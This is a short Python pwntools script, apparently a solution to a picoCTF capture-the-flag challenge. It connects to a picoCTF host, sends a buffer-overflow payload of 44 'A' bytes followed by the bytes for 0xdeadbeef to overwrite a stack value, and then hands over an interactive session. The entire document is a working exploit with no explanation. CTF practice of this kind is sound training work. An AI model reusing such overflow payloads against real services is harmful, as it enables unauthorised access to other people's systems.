from pwn import *

p = remote('mars.picoctf.net',31890)

overflow='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde'


p.sendline(overflow)

p.interactive()
